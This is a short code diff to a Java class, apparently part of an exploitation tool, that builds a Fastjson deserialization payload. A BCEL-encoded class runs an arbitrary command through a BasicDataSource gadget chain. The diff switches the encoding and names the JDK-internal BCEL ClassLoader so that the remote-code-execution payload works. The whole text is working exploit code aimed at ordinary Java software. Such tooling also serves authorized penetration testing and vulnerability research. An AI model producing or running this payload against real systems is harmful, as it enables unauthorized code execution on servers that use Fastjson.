@@ -75,7 +75,8 @@ public class FastjsonChainHandler implements ChainHandler {
         byte[] classBytes = generateBcelExecClass(cmd);
         // Use Apache BCEL's Utility.encode(bytes, true) with compression=true.
         // BCEL ClassLoader.createClass() calls Utility.decode(s, true) — must match.
-        String encoded = org.apache.bcel.classfile.Utility.encode(classBytes, true);
+        // JDK internal BCEL uses standard base64 with + → $ and / → !
+        String encoded = java.util.Base64.getEncoder().encodeToString(classBytes).replace("+", "$").replace("/", "!");
         return "$$BCEL$$" + encoded;
     }
 
@@ -127,7 +128,7 @@ public class FastjsonChainHandler implements ChainHandler {
     private String bcelJson(String driverClassName) {
         return String.format(
             "{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\"," +
-            "\"driverClassLoader\":{\"@type\":\"org.apache.bcel.util.ClassLoader\"}," +
+            "\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
             "\"driverClassName\":\"%s\"}", jsonEsc(driverClassName));
     }
 
